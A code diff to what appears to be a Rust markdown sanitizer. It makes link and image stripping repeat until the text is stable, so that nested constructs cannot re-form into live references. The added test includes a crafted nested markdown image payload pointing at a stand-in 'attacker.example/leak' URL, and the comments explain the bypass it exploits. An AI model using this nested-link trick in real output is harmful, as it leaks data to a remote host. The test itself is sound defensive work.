@@ -46,7 +46,52 @@ pub fn strip_sentinels(s: &str) -> std::borrow::Cow<'_, str> {
 /// scanner requires `(` directly after `]`, so an invisible char between them
 /// makes it miss the construct — and any later invisible strip would heal it
 /// back into a live ref.
+///
+/// The strip runs to its FIXED POINT (bounded): a single pass can heal a
+/// construct out of the surrounding prose — the label of an outer link is
+/// re-emitted unscanned, so `[![a](inner) c](outer)` welds the label onto the
+/// outer URL into a live `![a c](outer)` image (second-pass pinned). Each
+/// pass only deletes bytes, so a changed pass strictly shortens the input and
+/// the loop terminates by itself; [`FIXPOINT_PASSES`] bounds the CPU on
+/// pathological nesting, and overflow fails closed by dropping the construct
+/// trigger bytes entirely (no `[`/`]`/`!` → no link/image syntax at all).
 pub fn strip_markdown_refs(s: &str) -> String {
+    strip_to_fixpoint(s, strip_markdown_refs_once, |cur| {
+        cur.chars()
+            .filter(|c| !matches!(c, '[' | ']' | '!'))
+            .collect()
+    })
+}
+
+/// A delete-only strip applied this many times without change proves the text
+/// stable; a strip that is STILL changing after this many passes is under
+/// deliberate attack and gets the overflow sweep instead.
+const FIXPOINT_PASSES: usize = 64;
+
+/// Drive a delete-only strip to its fixed point. `overflow` is the fail-closed
+/// sweep for inputs still mutating at [`FIXPOINT_PASSES`] — pure attack shapes
+/// (deep-nested heal attempts), so dropping their trigger bytes is honest.
+pub(crate) fn strip_to_fixpoint(
+    s: &str,
+    once: fn(&str) -> String,
+    overflow: fn(&str) -> String,
+) -> String {
+    let mut cur = once(s);
+    // A pass that changed nothing sees identical bytes next round: stable.
+    if cur == s {
+        return cur;
+    }
+    for _ in 1..FIXPOINT_PASSES {
+        let next = once(&cur);
+        if next == cur {
+            return cur;
+        }
+        cur = next;
+    }
+    overflow(&cur)
+}
+
+fn strip_markdown_refs_once(s: &str) -> String {
     let bytes = s.as_bytes();
     let mut out = String::with_capacity(s.len());
     let mut i = 0usize;
@@ -163,6 +208,26 @@ mod tests {
     fn strip_markdown_refs_neutralizes_image_and_link() {
         assert_eq!(strip_markdown_refs("![a](http://x)"), "[a]");
         assert_eq!(strip_markdown_refs("[t](http://x)"), "t");
+    }
+
+    /// The label-heal forge: the outer link's label is re-emitted unscanned,
+    /// so a single pass welds `[![a](inner) c](outer)` into a LIVE
+    /// `![a c](outer)` image — exactly the dereference the strip exists to
+    /// kill. The fixed-point pass strips it; the output carries no `](` and
+    /// no remote host.
+    #[test]
+    fn strip_markdown_refs_does_not_heal_nested_construct() {
+        let forge = "[![a](junk) c](https://attacker.example/leak)";
+        let out = strip_markdown_refs(forge);
+        assert!(
+            !out.contains("]("),
+            "nested heal must not weld a live ref: {out:?}"
+        );
+        assert!(
+            !out.contains("attacker.example"),
+            "url must not survive: {out:?}"
+        );
+        assert_eq!(out, "[a c]");
     }
 
     #[test]
